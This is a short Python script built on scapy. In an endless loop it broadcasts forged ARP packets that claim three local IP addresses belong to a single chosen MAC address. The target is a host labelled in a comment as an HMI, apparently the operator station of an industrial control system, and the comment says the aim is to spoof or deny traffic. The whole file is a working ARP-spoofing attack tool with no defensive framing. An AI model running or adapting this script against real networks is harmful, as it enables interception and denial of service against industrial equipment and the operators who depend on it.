import random
import sys
import os
from scapy.all import *
from scapy.layers.inet import *
import code
import time


def sendARP(srcip, srcmac, dstip):
    a = ARP()

    # Source: What you want to spoof / deny from the destination
    a.psrc = srcip
    a.hwsrc = srcmac
    # Destination: HMI
    a.pdst = dstip
    a.hwdst = "ff:ff:ff:ff:ff:ff"

    send(a)


while True:
    sendARP(srcip="192.168.1.32", srcmac="4C:E1:73:4A:F3:35",
            dstip="192.168.1.246")
    sendARP(srcip="192.168.1.20", srcmac="4C:E1:73:4A:F3:35",
            dstip="192.168.1.246")
    sendARP(srcip="192.168.1.30", srcmac="4C:E1:73:4A:F3:35",
            dstip="192.168.1.246")
    time.sleep(1)
